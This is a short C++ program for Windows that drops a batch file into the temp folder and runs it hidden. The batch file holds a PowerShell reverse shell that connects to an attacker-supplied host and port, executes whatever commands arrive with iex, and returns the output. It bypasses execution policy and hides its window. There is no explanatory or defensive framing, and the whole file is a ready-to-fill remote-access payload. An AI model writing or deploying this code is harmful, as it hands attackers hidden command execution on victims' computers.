#include <windows.h>
#include <fstream>

int main() {
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);

    std::ofstream batchFile(std::string(tempPath) + "temp.bat");
    batchFile << "@echo off" << std::endl;
    batchFile << "powershell.exe -ExecutionPolicy Bypass -NoProfile -Command \"& { $code = (New-Object Net.Sockets.TcpClient('You can use play.gg for port forwarding', PORT)).GetStream(); [byte[]]$bytes = 0..65535 | ForEach-Object {0}; while (($i = $code.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object Text.ASCIIEncoding).GetString($bytes, 0, $i).Trim(); $result = (iex $data 2>&1 | Out-String); $encodedResult = [text.encoding]::ASCII.getbytes($result); $code.Write($encodedResult, 0, $encodedResult.Length); $code.Flush() }; $code.Close() }\"" << std::endl;

    ShellExecuteA(NULL, "open", ("cmd.exe"), ("/c start /min " + std::string(tempPath) + "temp.bat").c_str(), NULL, SW_HIDE);

    return 0;
}
